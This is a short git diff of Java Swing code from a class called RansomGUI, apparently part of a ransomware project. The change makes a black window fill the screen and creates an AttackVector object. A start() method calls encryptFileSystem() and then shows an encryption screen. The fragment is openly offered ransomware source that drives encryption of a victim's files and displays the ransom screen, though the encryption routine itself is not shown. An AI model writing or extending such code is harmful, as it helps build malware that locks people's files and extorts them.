@@ -2,6 +2,8 @@ package Agent.ransomGUI;
 
 import java.awt.BorderLayout;
 import java.awt.Color;
+import java.awt.Dimension;
+import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import javax.swing.JButton;
@@ -25,13 +27,15 @@ public class RansomGUI extends JFrame implements ActionListener {
 		panel = new JPanel();
 		panel.setVisible(true);
 		panel.setBackground(Color.BLACK);
+		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
 		this.add(panel);
+		this.setSize(screenSize.width, screenSize.height);
 		this.setVisible(true);
-
+		ransomProcess = new AttackVector();
 	}
 
 	public void start() throws AttackVectorException {
-
+		
 		try {
 			ransomProcess.encryptFileSystem();
 			encryptionScreen();
